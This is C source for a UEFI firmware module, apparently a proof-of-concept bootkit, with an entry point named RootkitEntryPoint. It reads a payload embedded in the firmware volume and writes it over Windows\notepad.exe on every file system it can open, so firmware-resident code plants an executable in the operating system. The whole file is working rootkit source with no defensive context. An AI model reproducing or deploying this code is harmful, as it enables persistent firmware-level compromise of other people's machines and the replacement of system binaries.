#include <Uefi.h>

#include <Pi/PiFirmwareVolume.h>
#include <Pi/PiFirmwareFile.h>

#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>

#include <Protocol/FirmwareVolume2.h>
#include <Protocol/SimpleFileSystem.h>

extern EFI_GUID gEfiPayloadGuid;

EFI_STATUS LoadPayload(IN EFI_HANDLE image_handle, OUT void **buffer, OUT UINTN *size)
{
    UINTN handles_size;
    EFI_HANDLE *handles;
    EFI_STATUS status = gBS->LocateHandleBuffer(ByProtocol, &gEfiFirmwareVolume2ProtocolGuid, NULL, &handles_size, &handles);
    if (EFI_ERROR(status))
    {
        Print(L"LocateHandleBuffer failed.\n");
        return status;
    }

    for (UINTN i = 0; i < handles_size; ++i)
    {
        EFI_FIRMWARE_VOLUME2_PROTOCOL *firmware_volume;
        status = gBS->OpenProtocol(handles[i],
                                   &gEfiFirmwareVolume2ProtocolGuid,
                                   (VOID **)&firmware_volume,
                                   image_handle,
                                   NULL,
                                   EFI_OPEN_PROTOCOL_GET_PROTOCOL);
        if (EFI_ERROR(status))
        {
            Print(L"OpenProtocol gEfiFirmwareVolume2ProtocolGuid failed.\n");
            continue;
        }

        UINT32 file_authentication_status;
        *buffer = NULL;
        firmware_volume->ReadSection(firmware_volume, &gEfiPayloadGuid, EFI_SECTION_RAW, 0, buffer, size, &file_authentication_status);
        if (EFI_ERROR(status))
        {
            Print(L"ReadSection failed.\n");
            return status;
        }

        Print(L"Payload of size %u bytes was read.\n", *size);

        return EFI_SUCCESS;
    }

    return RETURN_DEVICE_ERROR;
}

EFI_STATUS InjectPayload(IN EFI_HANDLE image_handle, IN void *buffer, IN UINTN size)
{
    UINTN handles_size;
    EFI_HANDLE *handles;
    EFI_STATUS status = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &handles_size, &handles);
    if (EFI_ERROR(status))
    {
        Print(L"LocateHandleBuffer failed.\n");
        return status;
    }

    EFI_STATUS return_value = RETURN_DEVICE_ERROR;
    for (UINTN i = 0; i < handles_size; ++i)
    {
        EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *file_system;
        status = gBS->OpenProtocol(handles[i],
                                   &gEfiSimpleFileSystemProtocolGuid,
                                   (VOID **)&file_system,
                                   image_handle,
                                   NULL,
                                   EFI_OPEN_PROTOCOL_GET_PROTOCOL);
        if (EFI_ERROR(status))
        {
            Print(L"OpenProtocol gEfiSimpleFileSystemProtocolGuid failed.");
            goto skip;
        }

        EFI_FILE_PROTOCOL *root;
        status = file_system->OpenVolume(file_system, &root);
        if (EFI_ERROR(status))
        {
            Print(L"OpenVolume failed.");
            goto skip;
        }

        EFI_FILE_PROTOCOL *windows_folder;
        status = root->Open(root, &windows_folder, L"Windows", EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
        if (EFI_ERROR(status))
        {
            Print(L"Open folder failed.");
            goto skip;
        }

        EFI_FILE_PROTOCOL *new_file;
        status = windows_folder->Open(windows_folder, &new_file, L"notepad.exe", EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
        if (EFI_ERROR(status))
        {
            Print(L"Open file failed.");
            goto skip;
        }

        UINTN written = size;
        status = new_file->Write(new_file, &written, buffer);
        if (EFI_ERROR(status) || written != size)
        {
            Print(L"Write file failed (written: %u).", written);
            goto skip;
        }

        status = new_file->Close(new_file);
        if (EFI_ERROR(status))
        {
            Print(L"Close file failed.");
            goto skip;
        }

        status = windows_folder->Close(windows_folder);
        if (EFI_ERROR(status))
        {
            Print(L"Close Folder failed.");
            goto skip;
        }

        Print(L"Payload of size %u bytes was written.\n", size);
        return_value = EFI_SUCCESS;
        continue;

    skip:
        Print(L" Skipping device.\n");
    }

    return return_value;
}

EFI_STATUS EFIAPI RootkitEntryPoint(IN EFI_HANDLE image_handle, IN EFI_SYSTEM_TABLE *system_table)
{
    UINTN payload_size;
    void *payload;
    EFI_STATUS status = LoadPayload(image_handle, &payload, &payload_size);
    if (EFI_ERROR(status))
    {
        Print(L"LoadPayload failed.\n");
        return status;
    }

    status = InjectPayload(image_handle, payload, payload_size);
    if (EFI_ERROR(status))
    {
        Print(L"InjectPayload failed.\n");
    }

    return status;
}